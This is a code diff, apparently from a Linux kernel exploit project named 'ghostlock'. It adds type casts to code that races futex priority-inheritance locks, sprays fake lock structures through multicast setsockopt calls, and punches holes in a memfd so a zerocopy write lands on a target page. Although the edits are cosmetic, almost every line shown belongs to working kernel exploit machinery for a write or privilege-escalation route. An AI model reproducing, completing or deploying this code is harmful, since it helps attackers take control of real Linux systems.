@@ -62,17 +62,17 @@ static int multicast_waiter_stamp(MulticastWaiterRouteContext *context,
     uint16_t family = AF_UNSPEC;
     memcpy(b + 8, &family, sizeof(family));
     return setsockopt(context->socket_fd, IPPROTO_IP, MCAST_BLOCK_SOURCE,
-            b, sizeof(b));
+            b, (socklen_t) sizeof(b));
 }
 
 static void *multicast_waiter_worker(void *arg) {
     auto *context = static_cast<MulticastWaiterRouteContext *>(arg);
-    pin_to_core(context->consumer_cpu);
+    pin_to_core((size_t) context->consumer_cpu);
     sigset_t set;
     sigemptyset(&set);
     sigaddset(&set, SIGUSR1);
     pthread_sigmask(SIG_UNBLOCK, &set, NULL);
-    atomic_store(&context->waiter_tid, syscall(SYS_gettid));
+    atomic_store(&context->waiter_tid, (int) syscall(SYS_gettid));
     futex_op(&context->lock2_futex, FUTEX_LOCK_PI_PRIVATE, 0, NULL, NULL, 0);
     atomic_store(&context->waiter_has_lock2, 1);
     while (!atomic_load(&context->owner_has_lock1)) sched_yield();
@@ -86,7 +86,7 @@ static void *multicast_waiter_worker(void *arg) {
     while (!atomic_load(&context->stop_requested)) {
         if (atomic_exchange(&context->respray_requested, 0)) {
             uintptr_t lock = context->lock + context->layout.lock_slots_offset +
-                    (context->lock_slot++ % context->layout.lock_slot_count) *
+                    ((size_t) context->lock_slot++ % context->layout.lock_slot_count) *
                             context->layout.lock_slot_stride;
             multicast_waiter_stamp(context, context->target, context->value, lock);
             atomic_store(&context->sprayed, 1);
@@ -105,7 +105,7 @@ static void *multicast_waiter_worker(void *arg) {
 
 static void *multicast_owner_worker(void *arg) {
     auto *context = static_cast<MulticastWaiterRouteContext *>(arg);
-    pin_to_core(context->main_cpu);
+    pin_to_core((size_t) context->main_cpu);
     while (!atomic_load(&context->waiter_has_lock2)) sched_yield();
     futex_op(&context->lock1_futex, FUTEX_LOCK_PI_PRIVATE, 0, NULL, NULL, 0);
     atomic_store(&context->owner_has_lock1, 1);
@@ -277,7 +277,7 @@ RouteStatus do_kernel5_fake_lock_route(const WriteRequest *request) {
     atomic_store(&ghostlock::g_exploit_session.race.route_delay_usec, 0);
     errno = 0;
     int stamp_result =
-            setsockopt(fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, stamp, sizeof(stamp));
+            setsockopt(fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, stamp, (socklen_t) sizeof(stamp));
     status.step = 61;
     status.error_number = errno;
     atomic_store(&ghostlock::g_exploit_session.race.consumer_go, 1);
@@ -371,7 +371,7 @@ static void *tcp_punch_thread(void *arg) {
         sched_yield();
     }
     while (!atomic_load(&context->punch_stop)) {
-        if (fallocate(context->punch_fd.get(), 0, 0, context->mapping_length) != 0) {
+        if (fallocate(context->punch_fd.get(), 0, 0, (off_t) context->mapping_length) != 0) {
             atomic_store(&context->punch_failed, errno ? errno : EIO);
             pr_warning("tcp punch fill errno=%d\n", errno);
             break;
@@ -380,7 +380,7 @@ static void *tcp_punch_thread(void *arg) {
         if (fallocate(context->punch_fd.get(),
                 FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE,
                 (off_t) context->page_size,
-                context->mapping_length - context->page_size) != 0) {
+                (off_t) (context->mapping_length - context->page_size)) != 0) {
             /* without the hole the target page keeps stale contents and the
              * zerocopy write misses */
             atomic_store(&context->punch_failed, errno ? errno : EIO);
@@ -412,7 +412,7 @@ int ghostlock::TcpZerocopyRoute::prepare() noexcept {
     punch_fd.reset(
             (int) syscall(SYS_memfd_create, "ghostlock-tcp", MFD_CLOEXEC));
     if (!punch_fd.valid() ||
-            fallocate(punch_fd.get(), 0, 0, mapping_length) != 0) {
+            fallocate(punch_fd.get(), 0, 0, (off_t) mapping_length) != 0) {
         pr_warning("tcp route memfd/fallocate errno=%d\n", errno);
         return fail(42, errno);
     }
